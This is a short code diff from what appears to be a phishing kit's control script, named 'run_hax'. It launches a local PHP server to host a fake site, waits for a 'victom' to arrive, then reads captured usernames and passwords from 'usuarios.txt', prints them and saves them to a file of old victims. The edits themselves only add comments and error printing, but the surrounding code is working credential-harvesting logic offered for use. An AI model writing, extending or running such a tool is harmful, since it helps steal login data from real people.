@@ -23,11 +23,12 @@ def run_hax(site):
 
     print(pending, 'Staring PHP Server...')
     try:
+        #   *   Backgrounding the PHP server
         bgtask(f'php.exe.lnk -S localhost:8080 -t {site}')
-        #os.system()
         print(good, 'PHP server is up at port: 8080')
-    except:
+    except Exception as e:
         print(err, 'Failed to Start PHP server :(')
+        print(e)
         exit()
     print(good, 'Link: http://localhost:8080')
     print(pending, 'Wating for victom to join...')
@@ -36,7 +37,7 @@ def run_hax(site):
         user = f'{site}/usuarios.txt'
         if os.path.isfile(user):
             print(good, 'User Found!')
-            print(cat(user))
+            print(cat(user)) #showing the victom's data
             with open(f'{site}\old_victoms_users.txt', 'w') as old_victoms_users:
                 with open(user, 'r') as current_victoms_users:
                     old_victoms_users.write(f"\n{current_victoms_users.read()}")
